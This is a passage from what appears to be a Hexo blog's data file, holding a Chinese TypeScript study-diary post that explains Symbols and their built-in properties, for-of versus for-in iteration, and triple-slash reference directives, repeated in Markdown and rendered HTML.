抽象操作调用。把对象转换为相应的原始值。\n\n**`Symbol.toStringTag`**\n方法，被内置方法 `Object.prototype.toString` 调用。返回创建对象时默认的字符串描述。\n\n**`Symbol.unscopables`**\n对象，它自己拥有的属性会被 `with` 作用域排除在外。\n\n更多关于 `Symbols` 的介绍可以查看[这里](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol)。\n\n### 迭代器(iterator)和生成器\n\n当一个对象实现了 `Symbol.iterator` 属性时，我们认为它是可迭代的。目前一些内置的类型如 `Array`，`Map`，`Set`，`String`，`Int32Array`，`Uint32Array` 等都已经实现了各自的 `Symbol.iterator`。 对象上的 `Symbol.iterator` 函数负责返回供迭代的值。\n\n\n#### `for-of` 语句\n\n`for-of` 会遍历可迭代的对象，调用对象上的 `Symbol.iterator` 方法。\n\n```js\nlet arr = [1, \"string\", false];\n\nfor (let val of arr) {\n    console.log(val); // 1, \"string\", false\n}\n```\n\n#### `for-of` vs `for-in`\n\n`for-of` 和 `for-in` 均可迭代一个列表；但是用于迭代的值却不同，`for-in` 迭代的是对象的 `键` 的列表，而`for-of` 则迭代对象的键对应的值。\n\n```js\nlet arr = [1, \"string\", false];\n\nfor(let key in arr) {\n    console.log(key); // 0, 1, 2\n}\n\nfor (let val of arr) {\n    console.log(val); // 1, \"string\", false\n}\n```\n\n另一个区别是 `for-in` 可以操作任何对象；它提供了查看对象属性的一种方法。 但是 `for-of` 关注于迭代对象的值。内置对象 `Map` 和 `Set` 已经实现了 `Symbol.iterator` 方法，让我们可以访问它们保存的值。\n\n```js\nlet pets = new Set([\"Cat\", \"Dog\", \"Hamster\"]);\npets[\"species\"] = \"mammals\";\n\nfor (let pet in pets) {\n    console.log(pet); // \"species\"\n}\n\nfor (let pet of pets) {\n    console.log(pet); // \"Cat\", \"Dog\", \"Hamster\"\n}\n```\n\n\n### 三斜线指令\n\n三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。\n\n三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在 `一个语句或声明` 之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。\n\n#### `/// <reference path=\"...\" />`\n\n`/// <reference path=\"...\" />` 指令是三斜线指令中最常见的一种。 它用于声明文件间的 `依赖`。三斜线引用告诉编译器在编译过程中要引入的额外的文件。\n\n#### 使用 `--noResolve`\n如果指定了 `--noResolve` 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。\n\n#### `/// <reference types=\"...\" />`\n与 `/// <reference path=\"...\" />` 指令相似，这个指令是用来声明依赖的； 一个 `/// <reference path=\"...\" />` 指令声明了对 `@types` 包的一个依赖。\n\n在声明文件里包含 `/// <reference types=\"node\" />`，表明这个文件使用了 `@types/node/index.d.ts` 里面声明的名字； 并且，这个包要在编译阶段与声明文件一起被包含进来。\n\n解析 `@types` 包的名字的过程与解析 `import` 语句里模块名的过程类似。 所以可以简单的把三斜线类型引用指令想像成针对包的 `import` 声明。\n\n仅当在你需要写一个 `d.ts` 文件时才使用这个指令。\n\n对于那些在编译阶段生成的声明文件，编译器会自动地添加 `/// <reference types=\"...\" />`； 当且仅当结果文件中使用了引用的@types包里的声明时才会在生成的声明文件里添加 `/// <reference types=\"...\" />` 语句。\n\n\n### 总结\n\n大致看了下，后面的内容都是一些需要记忆的内容，不会牵扯到太多的代码；这里就不再继续往下写了，有想阅读后面内容的朋友可以进入[Typescript中文文档](https://www.tslang.cn/index.html)继续学习。\n\n\n\n\n","slug":"Typescript学习日记（十）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qp000c02vswo8uj5si","content":"<p><code>symbol</code> 是 <code>ECMAScript 2015</code> 提出的一种行的原生类型，就像 <code>number</code> 和 <code>string</code> 一样。实现了 <code>Symbol.iterator</code> 方法就可以使用 <code>for-of</code> 遍历。<br><a id=\"more\"></a></p>\n<h3 id=\"Symbols\"><a href=\"#Symbols\" class=\"headerlink\" title=\"Symbols\"></a>Symbols</h3><h4 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 注意，Symbol() 并不是一个构造函数，所以不需要 new 关键字</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> sy = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'key'</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"Symbols是不可改变且唯一的\"><a href=\"#Symbols是不可改变且唯一的\" class=\"headerlink\" title=\"Symbols是不可改变且唯一的\"></a>Symbols是不可改变且唯一的</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sy1 = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'a'</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> sy2 = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'a'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">sy1 === sy2;  <span class=\"comment\">// -&gt; false</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"像字符串一样，symbols也可以被用做对象属性的键\"><a href=\"#像字符串一样，symbols也可以被用做对象属性的键\" class=\"headerlink\" title=\"像字符串一样，symbols也可以被用做对象属性的键\"></a>像字符串一样，symbols也可以被用做对象属性的键</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sy = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'key'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = &#123;</span><br><span class=\"line\">    [sy]: <span class=\"string\">\"value\"</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj[sym]); <span class=\"comment\">// \"value\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员\"><a href=\"#Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员\" class=\"headerlink\" title=\"Symbols也可以与计算出的 属性名声明相结合 来 声明对象的属性和类成员\"></a>Symbols也可以与计算出的 <code>属性名声明相结合</code> 来 <code>声明对象的属性和类成员</code></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getClassNameSymbol = <span class=\"built_in\">Symbol</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> </span>&#123;</span><br><span class=\"line\">    [getClassNameSymbol]()&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"string\">\"C\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"><span class=\"keyword\">let</span> className = c[getClassNameSymbol](); <span class=\"comment\">// \"C\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"内置属性\"><a href=\"#内置属性\" class=\"headerlink\" title=\"内置属性\"></a>内置属性</h4><p><strong><code>Symbol.hasInstance</code></strong><br>方法，会被 <code>instanceof</code> 运算符调用。构造器对象用来识别一个对象是否是其实例。</p>\n<p><strong><code>Symbol.isConcatSpreadable</code></strong><br>布尔值，表示当在一个对象上调用 <code>Array.prototype.concat</code> 时，这个对象的数组元素是否可展开。</p>\n<p><strong><code>Symbol.iterator</code></strong><br>方法，被for-of语句调用。返回对象的默认迭代器。</p>\n<p><strong><code>Symbol.match</code></strong><br>方法，被 <code>String.prototype.match</code> 调用。正则表达式用来匹配字符串。</p>\n<p><strong><code>Symbol.replace</code></strong><br>方法，被 <code>String.prototype.replace</code> 调用。正则表达式用来替换字符串中匹配的子串。</p>\n<p><strong><code>Symbol.search</code></strong><br>方法，被 <code>String.prototype.search</code> 调用。正则表达式返回被匹配部分在字符串中的索引。</p>\n<p><strong><code>Symbol.species</code></strong><br>函数值，为一个构造函数。用来创建派生对象。</p>\n<p><strong><code>Symbol.split</code></strong><br>方法，被 <code>String.prototype.split</code> 调用。正则表达式来用分割字符串。</p>\n<p><strong><code>Symbol.toPrimitive</code></strong><br>方法，被 <code>ToPrimitive</code> 抽象操作调用。把对象转换为相应的原始值。</p>\n<p><strong><code>Symbol.toStringTag</code></strong><br>方法，被内置方法 <code>Object.prototype.toString</code> 调用。返回创建对象时默认的字符串描述。</p>\n<p><strong><code>Symbol.unscopables</code></strong><br>对象，它自己拥有的属性会被 <code>with</code> 作用域排除在外。</p>\n<p>更多关于 <code>Symbols</code> 的介绍可以查看<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n<h3 id=\"迭代器-iterator-和生成器\"><a href=\"#迭代器-iterator-和生成器\" class=\"headerlink\" title=\"迭代器(iterator)和生成器\"></a>迭代器(iterator)和生成器</h3><p>当一个对象实现了 <code>Symbol.iterator</code> 属性时，我们认为它是可迭代的。目前一些内置的类型如 <code>Array</code>，<code>Map</code>，<code>Set</code>，<code>String</code>，<code>Int32Array</code>，<code>Uint32Array</code> 等都已经实现了各自的 <code>Symbol.iterator</code>。 对象上的 <code>Symbol.iterator</code> 函数负责返回供迭代的值。</p>\n<h4 id=\"for-of-语句\"><a href=\"#for-of-语句\" class=\"headerlink\" title=\"for-of 语句\"></a><code>for-of</code> 语句</h4><p><code>for-of</code> 会遍历可迭代的对象，调用对象上的 <code>Symbol.iterator</code> 方法。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"string\">\"string\"</span>, <span class=\"literal\">false</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> val <span class=\"keyword\">of</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">// 1, \"string\", false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"for-of-vs-for-in\"><a href=\"#for-of-vs-for-in\" class=\"headerlink\" title=\"for-of vs for-in\"></a><code>for-of</code> vs <code>for-in</code></h4><p><code>for-of</code> 和 <code>for-in</code> 均可迭代一个列表；但是用于迭代的值却不同，<code>for-in</code> 迭代的是对象的 <code>键</code> 的列表，而<code>for-of</code> 则迭代对象的键对应的值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"string\">\"string\"</span>, <span class=\"literal\">false</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(key); <span class=\"comment\">// 0, 1, 2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> val <span class=\"keyword\">of</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">// 1, \"string\", false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>另一个区别是 <code>for-in</code> 可以操作任何对象；它提供了查看对象属性的一种方法。 但是 <code>for-of</code> 关注于迭代对象的值。内置对象 <code>Map</code> 和 <code>Set</code> 已经实现了 <code>Symbol.iterator</code> 方法，让我们可以访问它们保存的值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> pets = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"string\">\"Cat\"</span>, <span class=\"string\">\"Dog\"</span>, <span class=\"string\">\"Hamster\"</span>]);</span><br><span class=\"line\">pets[<span class=\"string\">\"species\"</span>] = <span class=\"string\">\"mammals\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> pet <span class=\"keyword\">in</span> pets) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(pet); <span class=\"comment\">// \"species\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> pet <span class=\"keyword\">of</span> pets) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(pet); <span class=\"comment\">// \"Cat\", \"Dog\", \"Hamster\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三斜线指令\"><a href=\"#三斜线指令\" class=\"headerlink\" title=\"三斜线指令\"></a>三斜线指令</h3><p>三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。</p>\n<p>三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在 <code>一个语句或声明</code> 之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。</p>\n<h4 id=\"lt-reference-path-quot-quot-gt\"><a href=\"#lt-reference-path-quot-quot-gt\" class=\"headerlink\" title=\"/// &lt;reference path=&quot;...&quot; /&gt;\"></a><code>/// &lt;reference path=&quot;...&quot; /&gt;</code></h4><p><code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令是三斜线指令中最常见的一种。 它用于声明文件间的 <code>依赖</code>。三斜线引用告诉编译器在编译过程中要引入的额外的文件。</p>\n<h4 id=\"使用-noResolve\"><a href=\"#使用-noResolve\" class=\"headerlink\" title=\"使用 --noResolve\"></a>使用 <code>--noResolve</code></h4><p>如果指定了 <code>--noResolve</code> 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。</p>\n<h4 id=\"lt-reference-types-quot-quot-gt\"><a href=\"#lt-reference-types-quot-quot-gt\" class=\"headerlink\" title=\"/// &lt;reference types=&quot;...&quot; /&gt;\"></a><code>/// &lt;reference types=&quot;...&quot; /&gt;</code></h4><p>与 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令相似，这个指令是用来声明依赖的； 一个 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令声明了对 <code>@types</code> 包的一个依赖。</p>\n<p>在声明文件里包含 <code>/// &lt;reference types=&quot;node&quot; /&gt;</code>，表明这个文件使用了 <code>@types/node/index.d.ts</code> 里面声明的名字； 并且，这个包要在编译阶段与声明文件一起被包含进来。</p>\n<p>解析 <code>@types</code> 包的名字的过程与解析 <code>import</code> 语句里模块名的过程类似。 所以可以简单的把三斜线类型引用指令想像成针对包的 <code>import</code> 声明。</p>\n<p>仅当在你需要写一个 <code>d.ts</code> 文件时才使用这个指令。</p>\n<p>对于那些在编译阶段生成的声明文件，编译器会自动地添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code>； 当且仅当结果文件中使用了引用的@types包里的声明时才会在生成的声明文件里添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code> 语句。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>大致看了下，后面的内容都是一些需要记忆的内容，不会牵扯到太多的代码；这里就不再继续往下写了，有想阅读后面内容的朋友可以进入<a href=\"https://www.tslang.cn/index.html\" target=\"_blank\" rel=\"noopener\">Typescript中文文档</a>继续学习。</p>\n","site":{"data":{}},"excerpt":"<p><code>symbol</code> 是 <code>ECMAScript 2015</code> 提出的一种行的原生类型，就像 <code>number</code> 和 <code>string</code> 一样。实现了 <code>Symbol.iterator</code> 方法就可以使用 <code>for-of</code> 遍历。<br>","more":"</p>\n<h3 id=\"Symbols\"><a href=\"#Symbols\" class=\"headerlink\" title=\"Symbols\"></a>Symbols</h3><h4 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 注意，Symbol() 并不是一个构造函数，所以不需要 new 关键字</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> sy = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'key'</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"Symbols是不可改变且唯一的\"><a href=\"#Symbols是不可改变且唯一的\" class=\"headerlink\" title=\"Symbols是不可改变且唯一的\"></a>Symbols是不可改变且唯一的</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sy1 = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'a'</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> sy2 = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'a'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">sy1 === sy2;  <span class=\"comment\">// -&gt; false</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"像字符串一样，symbols也可以被用做对象属性的键\"><a href=\"#像字符串一样，symbols也可以被用做对象属性的键\" class=\"headerlink\" title=\"像字符串一样，symbols也可以被用做对象属性的键\"></a>像字符串一样，symbols也可以被用做对象属性的键</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sy = <span class=\"built_in\">Symbol</span>(<span class=\"string\">'key'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = &#123;</span><br><span class=\"line\">    [sy]: <span class=\"string\">\"value\"</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj[sym]); <span class=\"comment\">// \"value\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员\"><a href=\"#Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员\" class=\"headerlink\" title=\"Symbols也可以与计算出的 属性名声明相结合 来 声明对象的属性和类成员\"></a>Symbols也可以与计算出的 <code>属性名声明相结合</code> 来 <code>声明对象的属性和类成员</code></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getClassNameSymbol = <span class=\"built_in\">Symbol</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> </span>&#123;</span><br><span class=\"line\">    [getClassNameSymbol]()&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"string\">\"C\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"><span class=\"keyword\">let</span> className = c[getClassNameSymbol](); <span class=\"comment\">// \"C\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"内置属性\"><a href=\"#内置属性\" class=\"headerlink\" title=\"内置属性\"></a>内置属性</h4><p><strong><code>Symbol.hasInstance</code></strong><br>方法，会被 <code>instanceof</code> 运算符调用。构造器对象用来识别一个对象是否是其实例。</p>\n<p><strong><code>Symbol.isConcatSpreadable</code></strong><br>布尔值，表示当在一个对象上调用 <code>Array.prototype.concat</code> 时，这个对象的数组元素是否可展开。</p>\n<p><strong><code>Symbol.iterator</code></strong><br>方法，被for-of语句调用。返回对象的默认迭代器。</p>\n<p><strong><code>Symbol.match</code></strong><br>方法，被 <code>String.prototype.match</code> 调用。正则表达式用来匹配字符串。</p>\n<p><strong><code>Symbol.replace</code></strong><br>方法，被 <code>String.prototype.replace</code> 调用。正则表达式用来替换字符串中匹配的子串。</p>\n<p><strong><code>Symbol.search</code></strong><br>方法，被 <code>String.prototype.search</code> 调用。正则表达式返回被匹配部分在字符串中的索引。</p>\n<p><strong><code>Symbol.species</code></strong><br>函数值，为一个构造函数。用来创建派生对象。</p>\n<p><strong><code>Symbol.split</code></strong><br>方法，被 <code>String.prototype.split</code> 调用。正则表达式来用分割字符串。</p>\n<p><strong><code>Symbol.toPrimitive</code></strong><br>方法，被 <code>ToPrimitive</code> 抽象操作调用。把对象转换为相应的原始值。</p>\n<p><strong><code>Symbol.toStringTag</code></strong><br>方法，被内置方法 <code>Object.prototype.toString</code> 调用。返回创建对象时默认的字符串描述。</p>\n<p><strong><code>Symbol.unscopables</code></strong><br>对象，它自己拥有的属性会被 <code>with</code> 作用域排除在外。</p>\n<p>更多关于 <code>Symbols</code> 的介绍可以查看<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n<h3 id=\"迭代器-iterator-和生成器\"><a href=\"#迭代器-iterator-和生成器\" class=\"headerlink\" title=\"迭代器(iterator)和生成器\"></a>迭代器(iterator)和生成器</h3><p>当一个对象实现了 <code>Symbol.iterator</code> 属性时，我们认为它是可迭代的。目前一些内置的类型如 <code>Array</code>，<code>Map</code>，<code>Set</code>，<code>String</code>，<code>Int32Array</code>，<code>Uint32Array</code> 等都已经实现了各自的 <code>Symbol.iterator</code>。 对象上的 <code>Symbol.iterator</code> 函数负责返回供迭代的值。</p>\n<h4 id=\"for-of-语句\"><a href=\"#for-of-语句\" class=\"headerlink\" title=\"for-of 语句\"></a><code>for-of</code> 语句</h4><p><code>for-of</code> 会遍历可迭代的对象，调用对象上的 <code>Symbol.iterator</code> 方法。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"string\">\"string\"</span>, <span class=\"literal\">false</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> val <span class=\"keyword\">of</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">// 1, \"string\", false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"for-of-vs-for-in\"><a href=\"#for-of-vs-for-in\" class=\"headerlink\" title=\"for-of vs for-in\"></a><code>for-of</code> vs <code>for-in</code></h4><p><code>for-of</code> 和 <code>for-in</code> 均可迭代一个列表；但是用于迭代的值却不同，<code>for-in</code> 迭代的是对象的 <code>键</code> 的列表，而<code>for-of</code> 则迭代对象的键对应的值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"string\">\"string\"</span>, <span class=\"literal\">false</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(key); <span class=\"comment\">// 0, 1, 2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> val <span class=\"keyword\">of</span> arr) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">// 1, \"string\", false</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>另一个区别是 <code>for-in</code> 可以操作任何对象；它提供了查看对象属性的一种方法。 但是 <code>for-of</code> 关注于迭代对象的值。内置对象 <code>Map</code> 和 <code>Set</code> 已经实现了 <code>Symbol.iterator</code> 方法，让我们可以访问它们保存的值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> pets = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"string\">\"Cat\"</span>, <span class=\"string\">\"Dog\"</span>, <span class=\"string\">\"Hamster\"</span>]);</span><br><span class=\"line\">pets[<span class=\"string\">\"species\"</span>] = <span class=\"string\">\"mammals\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> pet <span class=\"keyword\">in</span> pets) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(pet); <span class=\"comment\">// \"species\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> pet <span class=\"keyword\">of</span> pets) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(pet); <span class=\"comment\">// \"Cat\", \"Dog\", \"Hamster\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三斜线指令\"><a href=\"#三斜线指令\" class=\"headerlink\" title=\"三斜线指令\"></a>三斜线指令</h3><p>三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。</p>\n<p>三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在 <code>一个语句或声明</code> 之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。</p>\n<h4 id=\"lt-reference-path-quot-quot-gt\"><a href=\"#lt-reference-path-quot-quot-gt\" class=\"headerlink\" title=\"/// &lt;reference path=&quot;...&quot; /&gt;\"></a><code>/// &lt;reference path=&quot;...&quot; /&gt;</code></h4><p><code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令是三斜线指令中最常见的一种。 它用于声明文件间的 <code>依赖</code>。三斜线引用告诉编译器在编译过程中要引入的额外的文件。</p>\n<h4 id=\"使用-noResolve\"><a href=\"#使用-noResolve\" class=\"headerlink\" title=\"使用 --noResolve\"></a>使用 <code>--noResolve</code></h4><p>如果指定了 <code>--noResolve</code> 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。</p>\n<h4 id=\"lt-reference-types-quot-quot-gt\"><a href=\"#lt-reference-types-quot-quot-gt\" class=\"headerlink\" title=\"/// &lt;reference types=&quot;...&quot; /&gt;\"></a><code>/// &lt;reference types=&quot;...&quot; /&gt;</code></h4><p>与 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令相似，这个指令是用来声明依赖的； 一个 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令声明了对 <code>@types</code> 